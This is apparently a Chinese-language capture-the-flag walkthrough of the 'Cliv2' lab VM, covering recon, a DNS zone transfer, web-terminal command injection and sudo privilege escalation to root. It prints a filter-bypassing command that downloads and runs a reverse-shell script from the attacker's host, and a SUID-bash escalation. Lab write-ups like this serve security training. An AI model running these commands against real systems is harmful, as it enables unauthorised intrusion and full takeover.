![image-20250803203858485](http://7r1UMPHK.github.io/image/20250803203858632.webp)

# **一、信息收集**

## 1. 主机发现

使用 `arp-scan` 在本地网络进行扫描，发现目标主机 IP 地址为 `192.168.205.240`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.240 08:00:27:aa:bc:4b       PCS Systemtechnik GmbH
...
```

## 2. 端口与服务扫描

通过 `nmap` 对目标主机进行全端口扫描，确认其开放了 22 (SSH), 53 (DNS) 和 80 (HTTP) 端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.240
...
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

对 DNS 服务进行版本侦察，确认为 ISC BIND 9.16.50。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p53 -sC -sV 192.168.205.240
...
PORT   STATE SERVICE VERSION
53/tcp open  domain  ISC BIND 9.16.50 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.16.50-Debian
...
```

## 3. Web 与 DNS 侦察

直接访问目标 IP 的 80 端口，页面会自动重定向到域名 `http://cliv2.dsz/`。因此，首先在攻击机上配置 `/etc/hosts` 文件，将该域名指向目标 IP。

```bash
# 在 /etc/hosts 文件中添加
192.168.205.240 cliv2.dsz
```

由于目标开放了 DNS 服务，尝试进行 DNS 区域传送（AXFR）攻击，成功获取了多个子域名。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dig axfr @192.168.205.240 cliv2.dsz
...
cliv2.dsz.              86400   IN      A       127.0.0.1
3170a7.cliv2.dsz.       86400   IN      A       127.0.0.1
client.cliv2.dsz.       86400   IN      A       127.0.0.1
dev.cliv2.dsz.          86400   IN      A       127.0.0.1
ns1.cliv2.dsz.          86400   IN      A       127.0.0.1
...
```

将发现的所有子域名一并添加到 `/etc/hosts` 文件中，以便后续访问。

```bash
# 更新 /etc/hosts 文件
192.168.205.240 cliv2.dsz 3170a7.cliv2.dsz client.cliv2.dsz dev.cliv2.dsz ns1.cliv2.dsz
```

# **二、初始访问**

## Web 渗透 (RCE)

在探测发现的子域名中，访问 `http://3170a7.cliv2.dsz/` 发现一个 Web 终端，该终端允许执行系统命令。

经过测试，后端对输入进行了过滤，禁止了空格和 `-` 等特殊字符。为了绕过空格限制，我们可以使用 shell 的内部字段分隔符 `${IFS}` 来代替。

**攻击步骤:**

1.  在攻击机 (Kali) 上创建一个反弹 shell 脚本 (`reverse.sh`)。
2.  在攻击机上开启一个临时的 HTTP 服务器（例如 `python3 -m http.server 80`）。
3.  在 Kali 上开启 `netcat` 监听。
4.  构造绕过空格限制的恶意命令，下载并执行反弹 shell 脚本。

**恶意命令:**

```bash
cd${IFS}/tmp/;busybox${IFS}wget${IFS}192.168.205.128/reverse.sh;bash${IFS}reverse.sh
```

在 Web 终端执行上述命令后，成功在本地 `netcat` 监听器上接收到了来自目标服务器的 `www-data` 用户反弹 shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.240] 53098
...
www-data@Cliv2:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# **三、权限提升**

## 1. 从 `www-data` 到 `bitc0de`

获取初始 shell 后，在 `/home` 目录下发现了用户 `bitc0de`。进一步检查 `/home/bitc0de` 目录，发现一个名为 `...` 的可疑文件。

```bash
www-data@Cliv2:/home/bitc0de$ ls -al
...
-rw-r--r-- 1 root    root      17 Jul 25 23:51 ...
-rw-r--r-- 1 root    root      44 Jul 25 22:35 user.txt
...
www-data@Cliv2:/home/bitc0de$ cat ...
MabEwReOmcpG!123
```

读取该文件内容，获得了一个密码 `MabEwReOmcpG!123`。同时，发现了 `user.txt`，读取后获得第一个 flag。

```bash
www-data@Cliv2:/home/bitc0de$ cat user.txt 
flag{user-60b725f10c9c85c70d97880dfe8191b3}
```

使用获取的密码，成功切换到 `bitc0de` 用户。

```bash
www-data@Cliv2:/home/bitc0de$ su bitc0de
Password: MabEwReOmcpG!123
bitc0de@Cliv2:~$ id
uid=1000(bitc0de) gid=1000(bitc0de) groups=1000(bitc0de)
```

## 2. 从 `bitc0de` 到 `root`

成为 `bitc0de` 用户后，执行 `sudo -l` 发现该用户可以无密码以 `ALL` 权限执行 `/usr/local/bin/hmvcli` 脚本。

```bash
bitc0de@Cliv2:~$ sudo -l
...
User bitc0de may run the following commands on Cliv2:
    (ALL) NOPASSWD: /usr/local/bin/hmvcli
```

分析该 Python 脚本 `/usr/local/bin/hmvcli` 的源代码，发现其中一段存在命令注入漏洞：

```python
...
parser.add_argument('-c', '--config', action='store_true', help='Run the setup script to configure credentials')
args = vars(parser.parse_args())

if args['config']:
    print("[*] Ejecutando script de configuración...")
    subprocess.run(["bash", "setup.sh"])  
    sys.exit(0)
...
```

当使用 `-c` 或 `--config` 参数运行此脚本时，它会以 `root` 权限（因为我们用了 `sudo`）执行当前目录下的 `setup.sh` 文件。我们可以利用这个逻辑来执行任意命令。

**提权步骤:**

1.  在 `bitc0de` 用户权限下，于任意可写目录（如 `/home/bitc0de` 或 `/tmp`）创建一个名为 `setup.sh` 的文件。
2.  在 `setup.sh` 中写入提权命令，这里我们使用 `chmod +s /bin/bash` 为 `bash` 程序设置 SUID 位，使其在执行时获得文件所有者（即 `root`）的权限。
3.  以 `sudo` 方式运行 `hmvcli` 脚本并带上 `-c` 参数，触发漏洞。
4.  执行 `bash -p` 以 root 权限启动一个新的 shell。

```bash
bitc0de@Cliv2:~$ cd /home/bitc0de
bitc0de@Cliv2:~$ echo "chmod +s /bin/bash" > setup.sh
bitc0de@Cliv2:~$ sudo /usr/local/bin/hmvcli -c
[*] Ejecutando script de configuración...
bitc0de@Cliv2:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
bitc0de@Cliv2:~$ bash -p
bash-5.0# id
uid=1000(bitc0de) gid=1000(bitc0de) euid=0(root) egid=0(root) groups=0(root),1000(bitc0de)
```

成功获取 `root` 权限。

# **四、夺取旗帜**

获取 `root` 权限后，读取最终的 `root.txt` 旗帜文件。

```bash
bash-5.0# cat /root/root.txt 
flag{root-12f54a96f64443246930da001cafda8b}

bash-5.0# cat /home/bitc0de/user.txt 
flag{user-60b725f10c9c85c70d97880dfe8191b3}
```

至此，所有旗帜均已夺取，渗透测试完成。